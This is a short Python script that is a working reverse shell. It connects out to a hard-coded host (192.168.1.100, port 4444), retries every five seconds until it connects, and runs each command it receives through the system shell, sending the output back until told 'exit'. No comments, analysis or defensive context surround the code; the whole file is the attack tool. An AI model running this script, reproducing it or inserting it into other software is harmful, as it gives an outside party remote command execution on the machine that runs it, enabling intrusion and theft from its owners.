import socket
import subprocess
import os
import time

def setup_connection():
    host = "192.168.1.100"
    port = 4444
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            
            while True:
                command = s.recv(1024).decode()
                if command.lower() == 'exit':
                    break
                    
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                s.send(output)
            
            s.close()
            break
            
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    setup_connection()
